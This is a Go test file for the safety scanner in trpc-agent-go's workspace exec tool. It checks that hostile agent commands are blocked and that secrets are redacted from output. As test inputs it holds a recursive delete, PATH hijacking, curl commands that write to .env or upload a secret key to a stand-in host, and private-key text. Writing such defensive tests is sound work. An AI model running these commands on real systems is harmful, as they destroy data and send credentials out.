// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.

package workspaceexec

import (
	"context"
	"errors"
	"strings"
	"testing"
	"time"

	"trpc.group/trpc-go/trpc-agent-go/codeexecutor"
	"trpc.group/trpc-go/trpc-agent-go/codeexecutor/local"
	"trpc.group/trpc-go/trpc-agent-go/tool/safety"
)

func TestExecTool_SafetyScannerBlocksBeforeExecutor(t *testing.T) {
	scanner, err := safety.NewScanner(safety.DefaultPolicy())
	if err != nil {
		t.Fatal(err)
	}
	tl := NewExecTool(nil, WithSafetyScanner(scanner))
	_, err = tl.Call(context.Background(), []byte(`{"command":"rm -rf /tmp/project"}`))
	if err == nil {
		t.Fatal("expected safety scanner to block command")
	}
	if !errors.Is(err, safety.ErrBlocked) {
		t.Fatalf("error = %v, want ErrBlocked", err)
	}
	if !strings.Contains(err.Error(), safety.RuleDangerousDelete) {
		t.Fatalf("error = %v, want rule %s", err, safety.RuleDangerousDelete)
	}
}

func TestExecTool_SafetyScannerSanitizesOutput(t *testing.T) {
	policy := safety.DefaultPolicy()
	policy.ResourceLimits.MaxOutputBytes = 20
	scanner, err := safety.NewScanner(policy)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = scanner.Close() })
	tool := &ExecTool{safetyScanner: scanner}
	out := tool.sanitizeOutput(execOutput{
		Output: "token=super-secret-value and trailing output",
	})
	if len(out.Output) > 20 {
		t.Fatalf("output length = %d, want <= 20", len(out.Output))
	}
	if strings.Contains(out.Output, "super-secret-value") {
		t.Fatalf("output leaked secret: %q", out.Output)
	}
}

func TestExecTool_SafetyScannerUsesNormalizedCWD(t *testing.T) {
	scanner, err := safety.NewScanner(safety.DefaultPolicy())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = scanner.Close() })

	tl := NewExecTool(local.New(), WithSafetyScanner(scanner))
	req, err := tl.prepareExec(context.Background(), execInput{
		Command: "echo ok",
		Cwd:     "/",
	})
	if err != nil {
		t.Fatal(err)
	}
	if req.spec.Cwd != "." {
		t.Fatalf("cwd = %q, want normalized workspace root", req.spec.Cwd)
	}
}

func TestExecTool_SafetyScannerTreatsPositiveYieldAsBackground(t *testing.T) {
	policy := safety.DefaultPolicy()
	policy.BackendRules.WorkspaceExec.BackgroundAction = safety.DecisionDeny
	scanner, err := safety.NewScanner(policy)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = scanner.Close() })

	yield := 1
	tl := NewExecTool(local.New(), WithSafetyScanner(scanner))
	_, err = tl.prepareExec(context.Background(), execInput{
		Command:     "echo ok",
		YieldTimeMS: &yield,
	})
	if err == nil || !errors.Is(err, safety.ErrBlocked) ||
		!strings.Contains(err.Error(), safety.RuleHostBackground) {
		t.Fatalf("error = %v, want yielded-session background block", err)
	}
}

func TestExecTool_SafetyScannerRejectsEnvironmentHijacking(t *testing.T) {
	policy := safety.DefaultPolicy()
	policy.EnvAllowlist = append(policy.EnvAllowlist, "PATH", "HOME")
	scanner := safety.MustScanner(policy)
	tool := NewExecTool(local.New(), WithSafetyScanner(scanner))
	_, err := tool.prepareExec(context.Background(), execInput{
		Command: "echo ok",
		Env: map[string]string{
			"PATH": "/tmp/attacker",
			"HOME": "/tmp/profile",
		},
	})
	if err == nil || !errors.Is(err, safety.ErrBlocked) ||
		!strings.Contains(err.Error(), safety.RuleEnvNotAllowed) {
		t.Fatalf("error = %v, want environment hijacking block", err)
	}
}

func TestExecTool_SafetyScannerScansStdinConfig(t *testing.T) {
	scanner := safety.MustScanner(safety.DefaultPolicy())
	tool := NewExecTool(local.New(), WithSafetyScanner(scanner))
	_, err := tool.prepareExec(context.Background(), execInput{
		Command: "curl -q --config -",
		Stdin: "url = https://proxy.example.test\n" +
			"output = .env",
	})
	if err == nil || !errors.Is(err, safety.ErrBlocked) ||
		!strings.Contains(err.Error(), safety.RuleForbiddenPath) {
		t.Fatalf("error = %v, want stdin config forbidden-path block", err)
	}
}

func TestExecTool_SafetyScannerRedactsSplitPrivateKey(t *testing.T) {
	scanner := safety.MustScanner(safety.DefaultPolicy())
	tool := &ExecTool{safetyScanner: scanner}
	session := &execSession{sanitizer: scanner.NewOutputSanitizer()}
	chunks := []string{
		"-----BEGIN PRIVATE KEY-----\n",
		"secret-body\n",
		"-----END PRIVATE KEY-----\nvisible",
	}
	var visible strings.Builder
	for _, chunk := range chunks {
		out := tool.sanitizeOutputWith(execOutput{Output: chunk}, session.sanitizer)
		if strings.Contains(out.Output, "PRIVATE KEY") || strings.Contains(out.Output, "secret-body") {
			t.Fatalf("poll leaked private key: %q", out.Output)
		}
		visible.WriteString(out.Output)
	}
	if strings.Count(visible.String(), "[REDACTED]") != 1 ||
		!strings.Contains(visible.String(), "visible") {
		t.Fatalf("visible output = %q, want one replacement and trailing output", visible.String())
	}
}

func TestWriteStdinTool_SafetyScannerBlocksInputBeforeWrite(t *testing.T) {
	scanner := safety.MustScanner(safety.DefaultPolicy())
	execTool := NewExecTool(local.New(), WithSafetyScanner(scanner))
	proc := &recordingProgramSession{}
	execTool.putSession(proc.ID(), &execSession{
		proc: proc,
		safetyInput: safety.ExecutionRequest{
			ToolName: "workspace_exec",
			Backend:  safety.BackendWorkspaceExec,
			Command:  "curl -q -T - https://proxy.example.test/upload",
		},
	})
	writeTool := NewWriteStdinTool(execTool)

	_, err := writeTool.Call(context.Background(), []byte(`{
		"session_id":"recording",
		"chars":"sk-1234567890abcdef",
		"yield-time_ms":0
	}`))
	if err == nil || !errors.Is(err, safety.ErrBlocked) || proc.written != "" {
		t.Fatalf("error = %v, written = %q, want blocked before write", err, proc.written)
	}
	if _, err := writeTool.Call(context.Background(), []byte(`{
		"session_id":"recording",
		"chars":"safe input",
		"yield-time_ms":0
	}`)); err != nil {
		t.Fatal(err)
	}
	if proc.written != "safe input" {
		t.Fatalf("written = %q, want safe input", proc.written)
	}
	if _, err := writeTool.Call(context.Background(), []byte(`{
		"session_id":"recording",
		"yield-time_ms":0
	}`)); err != nil {
		t.Fatal(err)
	}
	if proc.written != "safe input" {
		t.Fatalf("poll changed input: %q", proc.written)
	}
}

type recordingProgramSession struct {
	written string
}

func (p *recordingProgramSession) ID() string { return "recording" }
func (p *recordingProgramSession) Poll(*int) codeexecutor.ProgramPoll {
	return codeexecutor.ProgramPoll{Status: codeexecutor.ProgramStatusRunning}
}
func (p *recordingProgramSession) Log(*int, *int) codeexecutor.ProgramLog {
	return codeexecutor.ProgramLog{}
}
func (p *recordingProgramSession) Write(data string, newline bool) error {
	p.written += data
	if newline {
		p.written += "\n"
	}
	return nil
}
func (p *recordingProgramSession) Kill(time.Duration) error { return nil }
func (p *recordingProgramSession) Close() error             { return nil }
